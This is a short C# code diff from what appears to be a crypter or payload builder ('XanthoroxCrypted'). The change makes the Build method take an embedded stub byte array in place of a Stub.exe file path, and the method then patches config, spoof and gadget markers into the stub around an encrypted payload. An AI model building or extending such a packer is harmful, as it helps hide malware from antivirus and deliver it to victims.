@@ -119,13 +119,11 @@ namespace XanthoroxCrypted.Core
         private static readonly byte[] MARKER_SPOOF  = Encoding.ASCII.GetBytes("XSPOOF");
         private static readonly byte[] MARKER_GADGET = Encoding.ASCII.GetBytes("XGADGT");
 
-        public static string Build(string stubPath, string outputPath, byte[] payload,
+        public static string Build(byte[] stubData, string outputPath, byte[] payload,
             byte[] key, BuildConfig config, byte[]? researchParams = null)
         {
-            if (!File.Exists(stubPath))
-                return "Stub.exe not found at: " + stubPath;
-
-            byte[] stubData = File.ReadAllBytes(stubPath);
+            if (stubData == null || stubData.Length == 0)
+                return "Embedded stub data is empty.";
 
             // ── Patch CONFIG ──
             int configOffset = FindMarker(stubData, MARKER_CONFIG);
